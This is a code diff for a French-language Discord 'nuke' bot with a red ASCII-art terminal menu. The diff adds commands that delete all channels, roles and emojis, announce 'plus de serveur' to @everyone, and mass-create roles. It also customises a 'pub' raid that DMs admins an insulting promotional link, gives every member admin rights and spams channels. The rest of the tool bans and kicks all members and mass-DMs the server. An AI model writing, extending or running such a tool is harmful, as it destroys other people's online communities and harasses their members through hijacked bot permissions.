@@ -8,52 +8,6 @@ import sys
 
 init(autoreset=True)
 
-ASCII_ART_1 = """
-⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣰⠟⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡻⣧⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣰⡇⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠘⣧⠀⡀⠀⠀
-⠀⠀⠀⣰⡏⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⣧⠀⠀⠀
-⠀⠀⢰⠃⢸⠄⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⢾⠈⣧⠀⠀
-⠀⠀⢸⡄⢸⣄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⢀⡏⢀⣟⠀⠀
-⠀⢠⠿⡇⠈⣿⡀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⣽⠇⢀⡟⡆⠀
-⠀⢸⠀⢻⠂⠸⣷⡀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⢀⣼⡟⠀⡺⠀⣹⠀
-⠀⣼⡃⢸⣷⠄⢹⣿⣆⠸⣏⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢡⡇⢀⣿⣯⠀⣴⡗⠀⣿⡀
-⢸⡇⢷⣄⠹⣷⣬⣿⣿⡛⠻⣆⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠁⢀⡿⠛⣻⡿⢡⣼⠟⢀⡼⠁⡇
-⠀⢳⡀⣷⣄⡸⣿⣮⣿⣷⡀⠙⣶⣄⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣀⣴⠏⠀⣾⣿⣥⣿⠏⣀⣼⠁⡼⠃
-⠀⠈⣯⠈⢿⣦⡘⣿⡄⠙⢦⣀⢽⣿⣿⠶⠄⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠠⠶⣾⣿⡿⢁⡴⠛⢁⣼⠁⣴⡿⠋⣸⠇⠀
-⠀⠀⢸⠻⣆⠙⣿⣿⣿⣆⠀⢻⣷⣾⣿⣅⠀⠀⠀⣱⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢀⣽⣷⣾⡟⠀⢀⣾⣿⣿⠋⣐⡾⣻⠀⠀
-⠀⠀⠈⢧⡈⢿⣬⣽⣿⣉⠙⢲⣮⣽⡇⠀⠀⢀⡞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡆⠀⠀⢰⣿⣵⡶⠚⢉⣹⣟⣡⣼⠏⣠⠃⠀⠀
-⠀⠀⠀⠘⢷⣄⡉⠻⣿⣿⣥⣤⣿⣿⣿⡋⠀⠈⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠃⠀⢘⣿⣿⣿⣤⣤⣿⣿⠟⠋⣀⡴⠏⠀⠀⠀
-⠀⠀⠀⠀⠀⠈⠙⠒⢬⡿⠋⠀⠀⣘⣿⣷⡟⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⢘⣾⣿⣇⡀⠀⠈⢻⡯⠔⠚⠉⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠷⢤⡞⠉⠀⣩⣿⣿⣾⠀⠀⠈⢣⠀⠀⠀⠀⣰⠃⠀⡀⢻⣿⣿⣯⡀⠉⠓⡦⠽⠇⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣠⠞⠁⣰⠻⣿⣿⡧⠤⢌⣱⠄⠀⢾⡁⠤⢤⡿⣿⠟⢧⠀⠙⣦⣾⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣦⣧⣤⣏⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣜⣧⣬⣧⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-"""
-
-ASCII_ART_2 = """
-⠀⠀⠀⢀⣴⣾⣿⣿⣿⡶⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⢾⣿⣿⣿⣷⣦⡀⠀⠀⠀
-⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣡⣴⣾⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
-⠀⠀⠉⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⠛⠉⠁⠀⠀⠀⠈⠉⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣯⠁⠀⠀⠀⠀⠀⢈⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⢀⡴⢖⣛⣧⣴⣶⣤⣄⠹⡆⡀⠀⠀⠀⠀⡼⢃⣤⣴⣶⣧⣽⣛⡲⣤⠀⠀⠀⠀⠀
-⠀⢱⣄⣴⣟⠾⣿⣿⣿⣿⣿⣿⣿⡇⠀⡇⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣞⣷⣄⣴⠃⠀
-⢠⠟⠉⠉⠉⠛⠓⠿⠏⠸⠟⠛⠉⠀⢠⡇⠀⠀⠀⣿⠀⠀⠉⠛⠻⠇⠿⠟⠛⠋⠉⠉⠙⠻⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⢿⡇⠀⠀⠀⢿⠿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⡄⠀⠀⠀⠀⠀⠀⠀⣀⣤⢴⠏⠀⣸⠁⠀⠀⠀⢸⡆⠈⢳⡀⣤⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀
-⠀⢹⣶⢤⣤⡤⠴⠶⠛⠉⠀⠸⠀⣄⢻⣄⠀⠀⢀⣸⢃⣀⠰⠃⠈⠙⠓⠶⠤⣤⣤⢤⣾⠃⠀
-⠀⠈⢿⣆⠻⣿⣄⠀⠀⠀⠀⠀⠀⠉⣱⣬⣍⣉⣯⣥⡉⠁⠀⠀⠀⠀⠀⠀⣴⣿⢃⣾⡏⠀⠀
-⠀⠀⠈⢿⣆⠹⣿⣧⣀⣀⣀⣀⣤⣴⣿⣿⠟⠙⢿⣿⣿⣦⣄⣀⣀⣀⣠⣾⡿⠁⣼⠟⠀⠀⠀
-⠀⠀⠀⠈⢿⣦⡈⠻⠿⠿⠿⠿⢿⣿⣿⣋⣀⣀⣀⣻⣿⣿⠿⠿⠿⠿⠿⠛⣠⣾⠏⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠻⣎⠓⢤⣀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⣀⠴⢊⡿⠋⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀⢤⣄⣀⣠⡄⠀⠀⠀⠀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠱⣄⠀⠀⠀⠀⠀⠀⣿⣿⡏⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⣿⣿⣷⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-"""
 
 ASCII_ART_3 = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -87,7 +41,6 @@ ASCII_ART_3 = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 """
 
-# Quatrième ASCII art (nouveau)
 ASCII_ART_4 = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⡾⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -134,15 +87,11 @@ def clear_screen():
         os.system('clear')
 
 def show_ascii():
-    """Affiche l'ASCII art en rouge - alterne entre les 4 ASCII arts disponibles"""
+    """Affiche l'ASCII art en rouge - alterne entre les 2 ASCII arts disponibles"""
     global ascii_counter
     ascii_counter += 1
 
-    if ascii_counter % 4 == 1:
-        print(Fore.RED + ASCII_ART_1)
-    elif ascii_counter % 4 == 2:
-        print(Fore.RED + ASCII_ART_2)
-    elif ascii_counter % 4 == 3:
+    if ascii_counter % 2 == 1:
         print(Fore.RED + ASCII_ART_3)
     else:
         print(Fore.RED + ASCII_ART_4)
@@ -235,26 +184,33 @@ class DiscordBot(discord.Client):
         while True:
             clear_screen()
             show_ascii()
-            print(Fore.RED + "commandes")
-            print(Fore.RED + "1. nuke - Destruction totale du serveur")
-            print(Fore.RED + "2. alladmin - Donner admin a tout le monde")
-            print(Fore.RED + "3. banall - Bannir tous les membres")
-            print(Fore.RED + "4. kickall - Kicker tous les membres")
-            print(Fore.RED + "5. dm - Envoyer un message prive a une personne")
-            print(Fore.RED + "6. dmall - Envoyer un message prive a tout le serveur")
-            print(Fore.RED + "7. spam - Spammer un message dans tous les salons")
-            print(Fore.RED + "8. create - Creer des salons en masse")
-            print(Fore.RED + "9. kickbots - Kicker tous les bots")
-            print(Fore.RED + "10. leave - Faire quitter le bot du serveur")
-            print(Fore.RED + "11. rename - Renommer le serveur")
-            print(Fore.RED + "12. randomban - Bannir un membre aleatoire")
-            print(Fore.RED + "13. randomkick - Kicker un membre aleatoire")
-            print(Fore.RED + "14. pub - Pub TikTok et destruction")
+            print(Fore.RED + "COMMANDES ORGANISEES PAR CATEGORIE")
             print(Fore.RED + "")
-            print(Fore.RED + "Options: c = Menu principal | q = Quitter")
+            
+            print(Fore.RED + "┌─────── COLONNE 1 ─────┬─────── COLONNE 2 ─────┬─────── COLONNE 3 ─────┐")
+            print(Fore.RED + "│ 1. nuke - Destruction │ 7. delemojis - Sup    │ 13. leave - Faire     │")
+            print(Fore.RED + "│    totale du serveur  │    tous les emojis    │     quitter le bot    │")
+            print(Fore.RED + "│                       │                       │                       │")
+            print(Fore.RED + "│ 2. alladmin - Donner  │ 8. dm - Message prive │ 14. rename - Renommer │")
+            print(Fore.RED + "│    admin a tous       │    a une personne     │     le serveur        │")
+            print(Fore.RED + "│                       │                       │                       │")
+            print(Fore.RED + "│ 3. banall - Bannir    │ 9. dmall - Message    │ 15. randomban - Ban   │")
+            print(Fore.RED + "│    tous les membres   │    prive a tous       │     membre aleatoire  │")
+            print(Fore.RED + "│                       │                       │                       │")
+            print(Fore.RED + "│ 4. kickall - Kicker   │ 10. spam - Spammer   │ 16. randomkick - Kick │")
+            print(Fore.RED + "│    tous les membres   │     dans tous salons  │     membre aleatoire  │")
+            print(Fore.RED + "│                       │                       │                       │")
+            print(Fore.RED + "│ 5. delchans - Sup     │ 11. create - Creer    │ 17. pub - pub tout le │")
+            print(Fore.RED + "│    tous les salons    │     salons ou roles   │     serveur tkt pas   │")
+            print(Fore.RED + "│                       │                       │     c cool            │")
+            print(Fore.RED + "│ 6. delroles - Sup     │ 12. kickbots - Kicker │                       │")
+            print(Fore.RED + "│    tous les roles     │     tous les bots     │                       │")
+            print(Fore.RED + "└───────────────────────┴───────────────────────┴───────────────────────┘")
+            print(Fore.RED + "")
+            print(Fore.RED + "Touches: b = Retour | q = Quitter")
 
             try:
-                choice = input(Fore.RED + "Choisissez une commande (1-14, c, q ou b): ").strip().lower()
+                choice = input(Fore.RED + "Choisissez une commande (1-17, b ou q): ").strip().lower()
 
                 if choice == 'q':
                     clear_screen()
@@ -263,7 +219,9 @@ class DiscordBot(discord.Client):
                     await self.close()
                     return
                 elif choice == 'b':
-                    continue
+                    await self.select_server()
+                    if not self.selected_guild:
+                        return
                 elif choice == '1' or choice == 'nuke':
                     clear_screen()
                     show_ascii()
@@ -292,39 +250,58 @@ class DiscordBot(discord.Client):
                     await self.kick_everyone()
                     print(Fore.RED + "Tous les membres ont ete kickes!")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
-                elif choice == '5' or choice == 'dm':
+                elif choice == '5' or choice == 'delchans':
+                    clear_screen()
+                    show_ascii()
+                    print(Fore.RED + "Suppression de tous les salons en cours...")
+                    await self.delete_channels_only()
+                    print(Fore.RED + "Tous les salons ont ete supprimes!")
+                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                elif choice == '6' or choice == 'delroles':
+                    clear_screen()
+                    show_ascii()
+                    print(Fore.RED + "Suppression de tous les roles en cours...")
+                    await self.delete_roles_only()
+                    print(Fore.RED + "Tous les roles ont ete supprimes!")
+                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                elif choice == '7' or choice == 'delemojis':
+                    clear_screen()
+                    show_ascii()
+                    print(Fore.RED + "Suppression de tous les emojis en cours...")
+                    await self.delete_emojis_only()
+                    print(Fore.RED + "Tous les emojis ont ete supprimes!")
+                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                elif choice == '8' or choice == 'dm':
                     await self.send_dm()
-                elif choice == '6' or choice == 'dmall':
+                elif choice == '9' or choice == 'dmall':
                     await self.send_dm_all()
-                elif choice == '7' or choice == 'spam':
+                elif choice == '10' or choice == 'spam':
                     await self.spam_all_channels()
-                elif choice == '8' or choice == 'create':
+                elif choice == '11' or choice == 'create':
                     await self.create_channels()
-                elif choice == '9' or choice == 'kickbots':
+                elif choice == '12' or choice == 'kickbots':
                     clear_screen()
                     show_ascii()
                     print(Fore.RED + "Kick de tous les bots en cours...")
                     await self.kick_all_bots()
                     print(Fore.RED + "Tous les bots ont ete kickes!")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
-                elif choice == '10' or choice == 'leave':
+                elif choice == '13' or choice == 'leave':
                     clear_screen()
                     show_ascii()
                     await self.leave_server()
-                elif choice == '11' or choice == 'rename':
+                elif choice == '14' or choice == 'rename':
                     await self.rename_server()
-                elif choice == '12' or choice == 'randomban':
+                elif choice == '15' or choice == 'randomban':
                     await self.random_ban()
-                elif choice == '13' or choice == 'randomkick':
+                elif choice == '16' or choice == 'randomkick':
                     await self.random_kick()
-                elif choice == '14' or choice == 'pub':
+                elif choice == '17' or choice == 'pub':
                     await self.pub_tiktok()
-                elif choice == 'c':
-                    await self.select_server()
                 else:
                     clear_screen()
                     show_ascii()
-                    print(Fore.RED + "Choix invalide. Tapez 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, c, q ou b")
+                    print(Fore.RED + "Choix invalide. Tapez 1-17, b ou q")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
             except Exception as e:
@@ -350,7 +327,7 @@ class DiscordBot(discord.Client):
 
 
     async def delete_all_channels(self):
-        """Supprime TOUT du serveur sélectionné"""
+        """Supprime TOUT du serveur sélectionné et crée un salon final"""
         if not self.selected_guild:
             return
 
@@ -407,6 +384,48 @@ class DiscordBot(discord.Client):
         for member in members:
             try:
                 await member.ban(reason="nuke")
+            except:
+                continue
+
+        try:
+            final_channel = await self.selected_guild.create_text_channel("plus-de-serveur")
+            await final_channel.send("@everyone # plus de serveur @everyone")
+        except Exception as e:
+            print(Fore.RED + f"Erreur lors de la création du salon final: {e}")
+
+    async def delete_channels_only(self):
+        """Supprime uniquement tous les salons"""
+        if not self.selected_guild:
+            return
+
+        channels = list(self.selected_guild.channels)
+        for channel in channels:
+            try:
+                await channel.delete()
+            except:
+                continue
+
+    async def delete_roles_only(self):
+        """Supprime uniquement tous les rôles (sauf @everyone)"""
+        if not self.selected_guild:
+            return
+
+        roles = [role for role in self.selected_guild.roles if role.name != "@everyone"]
+        for role in roles:
+            try:
+                await role.delete()
+            except:
+                continue
+
+    async def delete_emojis_only(self):
+        """Supprime uniquement tous les emojis"""
+        if not self.selected_guild:
+            return
+
+        emojis = list(self.selected_guild.emojis)
+        for emoji in emojis:
+            try:
+                await emoji.delete()
             except:
                 continue
 
@@ -735,7 +754,7 @@ class DiscordBot(discord.Client):
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
     async def create_channels(self):
-        """Créer des salons en masse"""
+        """Menu de création : choisir entre salons ou rôles"""
         if not self.selected_guild:
             clear_screen()
             show_ascii()
@@ -743,6 +762,34 @@ class DiscordBot(discord.Client):
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
+        while True:
+            clear_screen()
+            show_ascii()
+            print(Fore.RED + f"Serveur: {self.selected_guild.name}")
+            print(Fore.RED + "=== MENU DE CREATION ===")
+            print(Fore.RED + "")
+            print(Fore.RED + "1. Creer des salons en masse")
+            print(Fore.RED + "2. Creer des roles en masse")
+            print(Fore.RED + "")
+            
+            choice = input(Fore.RED + "Choisissez une option (1, 2 ou 'b' pour retour): ").strip().lower()
+            
+            if choice == 'b':
+                return
+            elif choice == '1':
+                await self.create_channels_mass()
+                return
+            elif choice == '2':
+                await self.create_roles_mass()
+                return
+            else:
+                clear_screen()
+                show_ascii()
+                print(Fore.RED + "Choix invalide! Choisissez 1, 2 ou 'b'")
+                input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+    async def create_channels_mass(self):
+        """Créer des salons en masse"""
         clear_screen()
         show_ascii()
 
@@ -803,10 +850,85 @@ class DiscordBot(discord.Client):
 
             clear_screen()
             show_ascii()
-            print(Fore.RED + f"Creation terminee!")
-            print(Fore.RED + f"Salons crees avec succes: {created_count}")
-            print(Fore.RED + f"Echecs: {failed_count}")
-            print(Fore.RED + f"Total: {created_count + failed_count}")
+            print(Fore.RED + f"✅ Creation terminee!")
+            print(Fore.RED + f"✅ {created_count} salons crees avec succes")
+            if failed_count > 0:
+                print(Fore.RED + f"❌ {failed_count} echecs")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+        except Exception as e:
+            clear_screen()
+            show_ascii()
+            print(Fore.RED + f"❌ Erreur lors de la creation: {e}")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+    async def create_roles_mass(self):
+        """Créer des rôles en masse"""
+        clear_screen()
+        show_ascii()
+
+        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
+        print(Fore.RED + f"Nombre de roles actuels: {len(self.selected_guild.roles)}")
+
+        try:
+            base_name = input(Fore.RED + "Nom de base pour les roles (ou 'b' pour retourner): ").strip()
+            if not base_name:
+                clear_screen()
+                show_ascii()
+                print(Fore.RED + "Nom vide annule!")
+                input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                return
+            if base_name.lower() == 'b':
+                return
+
+            count_str = input(Fore.RED + "Combien de roles creer? (1-50 ou 'b' pour retourner): ").strip()
+            if count_str.lower() == 'b':
+                return
+            try:
+                count = int(count_str)
+                if not (1 <= count <= 50):
+                    clear_screen()
+                    show_ascii()
+                    print(Fore.RED + "Nombre invalide! Limite entre 1 et 50")
+                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                    return
+            except ValueError:
+                clear_screen()
+                show_ascii()
+                print(Fore.RED + "Nombre invalide!")
+                input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                return
+
+            clear_screen()
+            show_ascii()
+            print(Fore.RED + f"Creation de {count} roles en cours...")
+
+            created_count = 0
+            failed_count = 0
+
+            for i in range(1, count + 1):
+                try:
+                    role_name = base_name
+
+                    await self.selected_guild.create_role(
+                        name=role_name,
+                        color=discord.Color.random(),
+                        reason=f"Creation automatique via commande create"
+                    )
+                    created_count += 1
+                    print(Fore.RED + f"Role '{role_name}' cree")
+                    await asyncio.sleep(0.1)
+
+                except Exception as e:
+                    failed_count += 1
+                    print(Fore.RED + f"Erreur creation role: {e}")
+
+            clear_screen()
+            show_ascii()
+            print(Fore.RED + f"✅ Creation terminee!")
+            print(Fore.RED + f"✅ {created_count} roles crees avec succes")
+            if failed_count > 0:
+                print(Fore.RED + f"❌ {failed_count} echecs")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
         except Exception as e:
@@ -815,7 +937,7 @@ class DiscordBot(discord.Client):
             print(Fore.RED + f"Erreur: {e}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
-    
+
 
     async def kick_all_bots(self):
         """Kick tous les bots du serveur (sauf lui-même)"""
@@ -824,10 +946,10 @@ class DiscordBot(discord.Client):
 
         bots = [member for member in self.selected_guild.members 
                 if member.bot and member != self.user]
-        
+
         kicked_count = 0
         failed_count = 0
-        
+
         for bot in bots:
             try:
                 await bot.kick(reason="Kick all bots command")
@@ -838,7 +960,7 @@ class DiscordBot(discord.Client):
                 failed_count += 1
                 print(Fore.RED + f"Impossible de kicker {bot.name}: {e}")
                 continue
-                
+
         print(Fore.RED + f"Bots kickés avec succès: {kicked_count}")
         print(Fore.RED + f"Échecs: {failed_count}")
         print(Fore.RED + f"Total: {kicked_count + failed_count}")
@@ -852,7 +974,7 @@ class DiscordBot(discord.Client):
 
         server_name = self.selected_guild.name
         print(Fore.RED + f"Le bot quitte le serveur {server_name}...")
-        
+
         try:
             await self.selected_guild.leave()
             self.selected_guild = None
@@ -862,7 +984,7 @@ class DiscordBot(discord.Client):
             print(Fore.RED + "Vous devez maintenant selectionner un autre serveur.")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
             await self.select_server()
-                
+
         except Exception as e:
             clear_screen()
             show_ascii()
@@ -880,30 +1002,30 @@ class DiscordBot(discord.Client):
 
         clear_screen()
         show_ascii()
-        
+
         current_name = self.selected_guild.name
         print(Fore.RED + f"Serveur actuel: {current_name}")
-        
+
         try:
             new_name = input(Fore.RED + "Nouveau nom du serveur (ou 'b' pour retourner): ").strip()
-            
+
             if not new_name:
                 clear_screen()
                 show_ascii()
                 print(Fore.RED + "Nom vide annule!")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
-                
+
             if new_name.lower() == 'b':
                 return
-            
+
             if len(new_name) > 100:
                 clear_screen()
                 show_ascii()
                 print(Fore.RED + "Nom trop long! Maximum 100 caracteres.")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 return
-            
+
             print(Fore.RED + f"Renommage du serveur en cours...")
             await self.selected_guild.edit(name=new_name, reason="Renommage via commande rename")
             clear_screen()
@@ -912,7 +1034,7 @@ class DiscordBot(discord.Client):
             print(Fore.RED + f"Ancien nom: {current_name}")
             print(Fore.RED + f"Nouveau nom: {new_name}")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
-                
+
         except discord.Forbidden:
             clear_screen()
             show_ascii()
@@ -957,17 +1079,17 @@ class DiscordBot(discord.Client):
         try:
             import random
             random_member = random.choice(members)
-            
+
             print(Fore.RED + f"Membre selectionne aleatoirement: {random_member.display_name}")
             print(Fore.RED + f"Bannissement en cours...")
-            
+
             await random_member.ban(reason="Random ban command")
-            
+
             clear_screen()
             show_ascii()
             print(Fore.RED + f"✅ {random_member.display_name} a ete banni avec succes!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
-            
+
         except discord.Forbidden:
             clear_screen()
             show_ascii()
@@ -1006,17 +1128,17 @@ class DiscordBot(discord.Client):
         try:
             import random
             random_member = random.choice(members)
-            
+
             print(Fore.RED + f"Membre selectionne aleatoirement: {random_member.display_name}")
             print(Fore.RED + f"Kick en cours...")
-            
+
             await random_member.kick(reason="Random kick command")
-            
+
             clear_screen()
             show_ascii()
             print(Fore.RED + f"✅ {random_member.display_name} a ete kické avec succes!")
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
-            
+
         except discord.Forbidden:
             clear_screen()
             show_ascii()
@@ -1029,7 +1151,7 @@ class DiscordBot(discord.Client):
             input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
     async def pub_tiktok(self):
-        """Commande pub : DM aux admins, destruction totale et création salon spam"""
+        """Commande pub personnalisée : DM aux admins, destruction totale et création salon spam"""
         if not self.selected_guild:
             clear_screen()
             show_ascii()
@@ -1040,21 +1162,41 @@ class DiscordBot(discord.Client):
         clear_screen()
         show_ascii()
         print(Fore.RED + f"Serveur: {self.selected_guild.name}")
-        print(Fore.RED + "Lancement de la commande pub...")
-
-        dm_message = "abonne toi fdp ta plus de serveur https://www.tiktok.com/@kajoulcmoi"
+        print(Fore.RED + "=== CONFIGURATION DE LA PUB ===")
+        print(Fore.RED + "")
         
-        spam_message = "# abonne toi fdp https://www.tiktok.com/@kajoulcmoi @everyone"
+        while True:
+            user_link = input(Fore.RED + "Entrez votre lien (YouTube/TikTok/autre) ou 'b' pour retour: ").strip()
+            if user_link.lower() == 'b':
+                return
+            elif user_link and (user_link.startswith('http://') or user_link.startswith('https://') or user_link.startswith('www.')):
+                break
+            else:
+                print(Fore.RED + "Veuillez entrer un lien valide (doit commencer par http://, https:// ou www.)")
+        
+        salon_name = input(Fore.RED + "Nom du salon (laissez vide pour 'pub'): ").strip()
+        if not salon_name:
+            salon_name = "pub"
+        
+        dm_message = f"abonne toi fdp ta plus de serveur {user_link}"
+        spam_message = f"# abonne toi fdp {user_link} @everyone"
+
+        clear_screen()
+        show_ascii()
+        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
+        print(Fore.RED + f"Lien: {user_link}")
+        print(Fore.RED + f"Salon: {salon_name}")
+        print(Fore.RED + "Lancement de la commande pub...")
 
         try:
             print(Fore.RED + "Envoi des messages aux admins...")
             admins = []
-            
+
             for member in self.selected_guild.members:
                 if not member.bot and member != self.user:
                     if member.guild_permissions.administrator or member.guild_permissions.manage_guild:
                         admins.append(member)
-            
+
             if admins:
                 print(Fore.RED + f"Admins trouvés: {len(admins)}")
                 for admin in admins:
@@ -1076,14 +1218,14 @@ class DiscordBot(discord.Client):
                     color=discord.Color.red(),
                     reason="pub command"
                 )
-                
+
                 members = [member for member in self.selected_guild.members if not member.bot]
                 for member in members:
                     try:
                         await member.add_roles(admin_role)
                     except:
                         continue
-                        
+
                 print(Fore.RED + f"Permissions admin données à {len(members)} membres")
             except Exception as e:
                 print(Fore.RED + f"Erreur création rôle admin: {e}")
@@ -1121,7 +1263,7 @@ class DiscordBot(discord.Client):
